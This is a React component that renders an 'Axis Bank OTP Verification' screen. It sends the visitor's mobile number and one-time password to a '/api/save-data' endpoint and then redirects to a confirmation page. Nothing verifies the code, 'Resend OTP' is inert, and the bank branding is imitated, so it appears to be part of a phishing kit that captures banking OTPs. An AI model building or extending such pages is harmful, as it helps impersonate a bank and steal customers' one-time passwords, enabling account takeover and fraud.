import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";

const BASE_URL = process.env.REACT_APP_API_URL || "";

const AxisOtpVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const mobileNumber = location.state?.mobileNumber || "";

  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleOtpChange = (e) => {
    setOtp(e.target.value.replace(/\D/, ""));
  };

  const handleVerify = async () => {
    setLoading(true);
    setStatus(null);
    try {
      const res = await fetch(`${BASE_URL}/api/save-data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobileNumber,
          otp,
        }),
      });
      if (res.ok) {
        setStatus("success");
        // Redirect to confirmation page after success
        setTimeout(() => {
          navigate("/axis-confirmation");
        }, 900); // optional short delay for better UX
      } else {
        setStatus("error");
      }
    } catch {
      setStatus("error");
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 text-center">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <span className="text-[#9b1c31] font-bold text-lg">
            AXIS BANK
          </span>
        </div>
        {/* Title */}
        <h2 className="text-lg font-semibold text-gray-800 mb-1">
          Axis Bank OTP Verification
        </h2>
        {/* Subtitle */}
        <p className="text-sm text-gray-600 mb-6">
          Please enter the OTP sent to your registered mobile number.
        </p>
        {/* Status messages */}
        {status === "success" && (
          <div className="mb-4 text-green-600 font-medium">
            OTP Verified Successfully!
          </div>
        )}
        {status === "error" && (
          <div className="mb-4 text-red-600 font-medium">
            OTP Verification Failed. Please try again.
          </div>
        )}
        {/* OTP Label */}
        <label className="block text-sm font-medium text-gray-700 mb-2">
          OTP
        </label>
        {/* OTP Input */}
        <input
          type="text"
          maxLength={6}
          value={otp}
          onChange={handleOtpChange}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center tracking-widest text-lg focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent mb-6"
        />
        {/* Verify Button */}
        <button
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 transition mb-4"
          disabled={loading || otp.length !== 6}
          onClick={handleVerify}
        >
          {loading ? "Verifying..." : "Verify OTP"}
        </button>
        {/* Resend */}
        <p className="text-sm text-gray-600">
          Didn&apos;t receive the OTP?{" "}
          <span className="text-blue-600 font-medium cursor-pointer hover:underline">
            Resend OTP
          </span>
        </p>
      </div>
    </div>
  );
};

export default AxisOtpVerification;
